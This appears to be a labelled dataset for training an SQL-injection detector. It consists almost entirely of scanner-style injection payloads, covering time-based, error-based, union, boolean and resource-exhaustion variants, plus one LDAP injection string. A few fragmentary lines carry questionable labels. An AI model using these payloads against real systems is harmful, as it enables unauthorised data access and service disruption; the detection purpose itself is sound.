__label__nonmalicious  SELECT column_name  FROM table1 UNION SELECT column_name FROM table2;
__label__malicious  1'  )  )   )  and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( 'cgiu' = 'cgiu
__label__malicious  1 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 ) -- btqa
__label__malicious  1" )  as dlfq where 8410 = 8410
__label__malicious  1"  )  )   as rhea where 2982 = 2982 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) --
__label__malicious  1" )  as iwri where 4921 = 4921 or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) --
__label__malicious  1%"  )  )   )  union all select null,null,null,null,null,null,null--
__label__malicious  1" and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and "vziz" = "vziz
__label__malicious  -3737%" union all select 4452,4452,4452#
__label__malicious  1' )  where 2121 = 2121 or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --
__label__malicious  1" )  as kdvb where 2651 = 2651 and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --
__label__malicious  1"  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and "owzc" like "owzc
__label__malicious  1"  )  )   as knyf where 8109 = 8109 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --
__label__malicious  select sleep ( 5 )  and "jvys" like "jvys
__label__malicious  1'  )  )   )  union all select null,null,null,null,null,null,null,null--
__label__malicious  c
__label__malicious  1" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) 
__label__malicious  -5210" )  where 7176 = 7176 or 6872 = 6872--
__label__malicious  -4259'  )  )   as usqu where 5419 = 5419 or elt ( 8325 = 8837,8837 ) --
__label__malicious  select pg_sleep ( 5  )  )  ||'
__label__malicious  1'  )  )   as cgey where 2130 = 2130 and make_set ( 7914 = 4032,4032 ) --
__label__malicious  -3250%" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--
__label__malicious  -1639  )  )   or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 5023 = 5023 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (  3318 = 3318
__label__malicious  1'  )  )   and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and   (  (  'vpqr' = 'vpqr
__label__malicious  1%"  )  )   )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( "%" = "
__label__malicious  -1048%" or 3038 = 3038
__label__malicious  1' in boolean mode )  and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --
__label__malicious  1%'  )  )   union all select null,null,null,null--
__label__malicious  1" rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #
__label__malicious  1, ( select  ( case when  ( 7711 = 7711 )  then 1 else 7711* ( select 7711 from information_schema.character_sets )  end  )  )  
__label__malicious  1%" )  union all select null,null#
__label__malicious  select  ( case when  ( 7997 = 1543 )  then 7997 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--
__label__malicious  1  )  )   as xlww where 5844 = 5844
__label__malicious  1'  )  )   )  or sleep ( 5 )  and   (  (   ( 'ecur' = 'ecur
__label__malicious  1%' )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and  ( '%' = '
__label__malicious  1" and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --
__label__malicious  1 uni/**/on select all from where
__label__malicious  1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and 'dubu' like 'dubu
__label__malicious  1 waitfor delay '0:0:5'--
__label__malicious  1 where 4477 = 4477 union all select null,null,null,null,null,null,null,null,null,null--
__label__malicious  -3475" or elt ( 5532 = 4242,4242 ) 
__label__malicious  1%' or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and '%' = '
__label__malicious  1"  )  )   as wssb where 5772 = 5772
__label__malicious  -3107' )  where 7782 = 7782 or 8571 = 8571--
__label__malicious   select * from users where id = '1' or \.<$ union select 1,@@VERSION -- 1'
__label__malicious  1" )  and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and  ( "dppw" like "dppw
__label__malicious  1"  )  )   as eglv where 7412 = 7412 union all select null#
__label__malicious  -8695 union all select 6087,6087,6087,6087,6087,6087,6087,6087,6087,6087#
__label__malicious  select  ( case when  ( 7217 = 7631 )  then 7217 else 7217* ( select 7217 from information_schema.character_sets )  end ) #
__label__malicious  1" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and "menm" like "menm
__label__malicious  ' or 1 in  ( select @@version ) --
__label__malicious   select * from users where id = 1<@<@ union select 1,version (  )  -- 1
__label__malicious   end and   (  (   ( "%" = "
__label__malicious  1%"  )  )   )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( "%" = "
__label__malicious  -1106'  )  )   union all select 2855,2855,2855,2855,2855,2855,2855#
__label__malicious  -5849 )  union all select 6168,6168,6168,6168,6168,6168,6168,6168#
__label__malicious  select  ( case when  ( 4291 = 6937 )  then 4291 else 4291* ( select 4291 from mysql.db )  end ) #
__label__malicious  -2745' or elt ( 1032 = 1032,3623 ) 
__label__malicious  1'  )  )   as yyja where 4321 = 4321 or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --
__label__malicious  select count ( * )  from generate_series ( 1,5000000 ) -- gqkk
__label__malicious  1' )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  ( 'qbdm' = 'qbdm
__label__malicious  1" )  where 8153 = 8153
__label__malicious  1'  )  )   or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (  'uwrm' = 'uwrm
__label__malicious  1 )  as ujjg where 3125 = 3125 union all select null,null,null,null,null,null#
__label__malicious  1" )  where 3321 = 3321
__label__malicious  1'  )  )   )  or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --
__label__malicious  -6965' )  union all select 2857,2857,2857,2857,2857,2857,2857,2857,2857,2857--
__label__malicious  ' union  ( select NULL, NULL, NULL,   ( select @@version  )  )   --
__label__malicious  1"  )  )   rlike sleep ( 5 ) #
__label__malicious  1" )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and  ( "rwlq" = "rwlq
__label__malicious  1" where 9342 = 9342 and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --
__label__malicious  1 )  as gfhf where 5804 = 5804 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  --
__label__malicious  1" and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  
__label__malicious  1%"  )  )   union all select null,null,null,null,null,null--
__label__malicious  1%'  )  )   )  and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --
__label__malicious  ' union all select @@version--
__label__malicious  1" and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and "ojpe" like "ojpe
__label__malicious  1"  )  )   as uqem where 3521 = 3521
__label__malicious  1'  )  )   or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and   (  (  'stqq' = 'stqq
__label__malicious  -7764" or 7308 = 7805
__label__malicious  1'+ ( select ukwc where 3008 = 3008 or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #
__label__malicious  1"  )  )   union all select null,null--
__label__malicious  1\'1
__label__malicious  -9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--
__label__malicious  select  ( case when  ( 1868 = 5071 )  then 1 else 1868* ( select 1868 from master..sysdatabases )  end ) --
__label__malicious  1" and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  
__label__malicious  1' or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and 'bwtk' = 'bwtk
__label__malicious  -2759%"  )  )   or 7769 = 1249#
__label__malicious  1" )  as fcrx where 2929 = 2929 and 2820 = 5133
__label__malicious  1%'  )  )   and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --
__label__malicious  -5365 or 7517 = 5726--
__label__malicious  -5657'  )  )   )  union all select 8071,8071,8071,8071,8071,8071,8071,8071#
__label__malicious  iif ( 1305 = 5656,1,1/0 ) 
__label__malicious  1%' union all select null,null,null,null#
__label__malicious  1" and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and "bzzt" like "bzzt
__label__malicious  1'  )  )   )  or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (   ( 'cjre' = 'cjre
__label__malicious  1' where 7080 = 7080 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #
__label__malicious  ' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 8  )  )   AND 'i' = 'i
__label__malicious  1' )  and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --
__label__malicious  1' )  as pfwt where 8448 = 8448 union all select null,null,null,null,null,null,null,null,null#
__label__malicious  1" )  or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  ( "ponv" = "ponv
__label__malicious  1' )  as nexa where 6740 = 6740
__label__malicious  -1033 union all select 8731,8731,8731,8731,8731,8731--
__label__malicious   select * from users where id = 1 union select 1<@$,version (  )  -- 1
__label__malicious  1%'  )  )   )  or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and   (  (   ( '%' = '
__label__malicious  " ) ;waitfor delay '0:0:__TIME__'--
__label__malicious  -6514  )  )   as pbgg where 6841 = 6841 union all select 6841,6841,6841,6841--
__label__malicious  1'+ ( select gqez where 3704 = 3704
__label__malicious  -1287" )  as bbzg where 1475 = 1475 union all select 1475,1475,1475,1475,1475,1475,1475,1475,1475#
__label__malicious  1" )  as pydh where 3407 = 3407 and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --
__label__malicious  1%"  )  )   or sleep ( 5 )  and   (  (  "%" = "
__label__malicious  1 )  union all select null,null,null,null,null#
__label__malicious  1%' )  procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and  ( '%' = '
__label__malicious  1' )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and  ( 'lwlh' = 'lwlh
__label__malicious  1'  )  )   as lrnh where 8569 = 8569 union all select null,null,null,null,null--
__label__malicious  1"  )  )   union all select null,null#
__label__malicious  exec xp
__label__malicious  1'  )  )   )  and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (   ( 'mbxh' like 'mbxh
__label__malicious  1"  )  )   )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (   ( "fjwv" like "fjwv
__label__malicious  select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (  "%" = "
__label__malicious  1%' and sleep ( 5 )  and '%' = '
__label__malicious  1%'  )  )   )  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and   (  (   ( '%' = '
__label__malicious  ' )  or  ( 'x' = 'x
__label__malicious  1'+ ( select sxco where 1623 = 1623 union all select null,null--
__label__malicious  -5520%" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--
__label__malicious   select * from users where id = 1 or ".." = 1 or 1 = 1 -- 1
__label__malicious  1'  )  )   as dago where 9788 = 9788
__label__malicious  -9871 union all select 6094,6094,6094,6094,6094,6094,6094#
__label__malicious  1'+ ( select cxvy where 7421 = 7421
__label__malicious  1'|| ( select 'wyng' from dual where 2157 = 2157 union all select null,null--
__label__malicious  1'+ ( select aahc where 5436 = 5436 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   ) +'
__label__malicious  -3956' )  or  ( 8459 = 8459 ) *4906 and  ( 'rflo' like 'rflo
__label__malicious  1" where 2886 = 2886
__label__malicious  1'  )  )   as hqhs where 5383 = 5383
__label__malicious  -5959" or 2477 = 1144
__label__malicious  -5617 )  where 2132 = 2132 union all select 2132,2132,2132,2132#
__label__malicious  1' )  and make_set ( 6488 = 5525,5525 ) 
__label__malicious  select sleep ( 5 )  and  ( '%' = '
__label__malicious  1' where 9024 = 9024 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) --
__label__malicious  * ( | ( objectclass = *  )  )  
__label__malicious  1  )  )   )  or sleep ( 5 )  and   (  (   ( 2209 = 2209
__label__malicious  1%' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and '%' = '
__label__malicious  1%"  )  )   )  and 7758 = 4792 and   (  (   ( "%" = "
__label__malicious  -6527'  )  )   union all select 5053,5053,5053,5053--
__label__malicious  23 OR 1 = 1
__label__malicious  1%" ) 
__label__malicious  1'  )  )   or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and   (  (  'xuwl' like 'xuwl
__label__malicious  -1351" where 6968 = 6968 or 5684 = 8582
__label__malicious  -1573" )  union all select 3928,3928,3928,3928--
__label__malicious  -4355"  )  )   )  or 9323 = 9323#
__label__malicious  select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and 'hvqt' = 'hvqt
__label__malicious  1' )  where 2802 = 2802 union all select null,null,null#
__label__malicious  1'|| ( select 'hwyv' from dual where 1155 = 1155 and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   ) ||'
__label__malicious  1'  )  )   )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( 'ofko' = 'ofko
__label__malicious  -9031%" )  order by 1--
__label__malicious  -4100'  )  )   union all select 1163,1163,1163--
__label__malicious  1'+ ( select 'sqje' where 1634 = 1634 or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   ) +'
__label__malicious  1" )  as vcvw where 2445 = 2445 and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --
__label__malicious  1' )  where 6941 = 6941 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --
__label__malicious  -3130'  )  )   )  union all select 2886,2886,2886,2886,2886,2886,2886#
__label__malicious  1 )  as azoo where 8933 = 8933 and  ( 3020 = 3020 ) *6703--
__label__malicious  -3300' union all select 8979,8979,8979,8979,8979,8979--
__label__malicious  1" )  as ebvt where 5305 = 5305
__label__malicious  -6249'  )  )   )  union all select 5136,5136,5136,5136,5136,5136,5136,5136,5136--
__label__malicious  1"  )  )   )  and elt ( 4249 = 4249,7259 )  and   (  (   ( "vhmc" = "vhmc
__label__malicious  1 )  as tngy where 8956 = 8956 rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )  --
__label__malicious  ' or username like '%
__label__malicious  1" and 7533 = 7533 and "dqjp" = "dqjp
__label__malicious   select * from users where id = 1 or "1&" or 1 = 1 -- 1
__label__malicious  1'  )  )   or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and   (  (  'ossj' = 'ossj
__label__malicious   select * from users where id = 1<@.. union select 1,version (  )  -- 1
__label__malicious  1" )  where 2473 = 2473 and make_set ( 6118 = 7684,7684 ) --
__label__malicious  -9978" or make_set ( 4893 = 9765,9765 )  and "mhjt" = "mhjt
__label__malicious  -5516'+ ( select 'bmlv' where 7188 = 7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#
__label__malicious  1"  )  )   procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and   (  (  "rtyu" like "rtyu
__label__malicious  1%' )  and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( '%' = '
__label__malicious  -1393'  )  )   )  union all select 8280--
__label__malicious   select * from users where id = 1 or ". ) " or 1 = 1 -- 1
__label__malicious  1" )  union all select null--
__label__malicious   select * from users where id = 1 +  ( $+ )  union select null,@@VERSION -- 1
__label__malicious  -2120" )  union all select 9614--
__label__malicious  1" )  as pgza where 8756 = 8756 or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --
__label__malicious  call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and "rugr" = "rugr
__label__malicious  -8812 or 6872 = 6872# dflr
__label__malicious   select * from users where id = 1 or ";_" or 1 = 1 -- 1
__label__malicious  1'+ ( select oogh where 1167 = 1167 or elt ( 5873 = 5873,sleep ( 5  )  )  #
__label__malicious  -1603'  )  )   or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (  'abmo' = 'abmo
__label__malicious  1 where 6036 = 6036 and 7533 = 7533--
__label__malicious  1' and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and 'lvyw' = 'lvyw
__label__malicious  1 where 8921 = 8921 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo ) --
__label__malicious  iif ( 2205 = 4764,1,1/0 ) 
__label__malicious  1'+ ( select gguu where 7809 = 7809 union all select null--
__label__malicious  UEs
__label__malicious  -1263" )  or 9323 = 9323#
__label__malicious   select sleep ( 5 )  and 'hhrw' like 'hhrw
__label__malicious  1"  )  )   )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( "sdvu" like "sdvu
__label__malicious  -9896"  )  )   )  union all select 4073,4073,4073,4073,4073#
__label__malicious  1" )  where 5358 = 5358
__label__malicious  1' )  as rqfq where 7077 = 7077 or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --
__label__malicious  -7006' where 6966 = 6966 union all select 6966,6966,6966,6966#
__label__malicious  1' )  where 9951 = 9951  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   ) --
__label__malicious  -2679'  )  )   )  or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and   (  (   ( 'cutk' like 'cutk
__label__malicious  1' where 8584 = 8584 order by 1#
__label__malicious  select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  (  '%' = '
__label__malicious  -7246'|| ( select 'qchp' from dual where 8317 = 8317 order by 1--
__label__malicious  select  ( case when  ( 4306 = 2815 )  then 4306 else 1/ ( select 0 )  end ) --
__label__malicious  select  ( case when  ( 7978 = 6009 )  then 7978 else 1/ ( select 0 )  end ) --
__label__malicious  1' and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and 'dphz' = 'dphz
__label__malicious  1 or benchmark ( 10000000,MD5 ( 1  )  )  #
__label__malicious  1"  )  )   )  or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and   (  (   ( "uzjn" = "uzjn
__label__malicious  -4896' )  union all select 1929--
__label__malicious  1' )  rlike sleep ( 5 )  and  ( 'qsub' like 'qsub
__label__malicious  1' )  as xhmm where 8092 = 8092 union all select null,null,null--
__label__malicious  1' where 7504 = 7504 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --
__label__malicious  1  )  )   as rhwg where 8843 = 8843
__label__malicious  or 1 = 1 or "" = 
__label__malicious  -5866'  )  )   as phzq where 3803 = 3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--
__label__malicious  -9947"  )  )   )  union all select 8765,8765,8765,8765,8765#
__label__malicious  1 )  union all select null,null,null,null#
__label__malicious  1'|| ( select 'dpce' from dual where 5261 = 5261 union all select null,null,null,null,null,null--
__label__malicious  1' )  or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --
__label__malicious  select pg_sleep ( 5 )  and   (  (  "byhx" like "byhx
__label__malicious  1' )  union all select null,null,null,null,null,null,null,null--
__label__malicious  1%'  )  )   union all select null,null,null,null#
__label__malicious  1'  )  )   as bsvk where 5985 = 5985 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )  --
__label__malicious  1'  )  )   )  and 5615 = 5458--
__label__malicious  -7435' )  where 6242 = 6242 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  --
__label__malicious  1' )  as zmvn where 2887 = 2887 union all select null--
__label__malicious  1,iif ( 7475 = 7475,1,1/0 ) 
__label__malicious  -1998' )  as kgvf where 2346 = 2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--
__label__malicious  1  )  )   )  and 9198 = 9198--
__label__malicious  1'  )  )   and elt ( 1210 = 1210,sleep ( 5  )  )   and   (  (  'jnmf' = 'jnmf
__label__malicious  select pg_sleep ( 5 )  and   (  (  "qani" = "qani
__label__malicious  1'  )  )   as gfzb where 7904 = 7904
__label__malicious  1' )  and 7533 = 7533 and  ( 'dbjq' = 'dbjq
__label__malicious  1 )  rlike sleep ( 5 ) #
__label__malicious  1"  )  )   )  and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and   (  (   ( "uqyb" = "uqyb
__label__malicious   ( select * from generate_series ( 4990,4990,case when  ( 4990 = 5065 )  then 1 else 0 end )  limit 1 ) 
__label__malicious  1%' )  or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and  ( '%' = '
__label__malicious  1%' )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and  ( '%' = '
__label__malicious  1%' or elt ( 6272 = 6272,sleep ( 5  )  )   and '%' = '
__label__malicious  -3081"  )  )   )  or 3736 = 1899
__label__malicious   ( 7098 = 7098 and sleep ( 5  )  )  
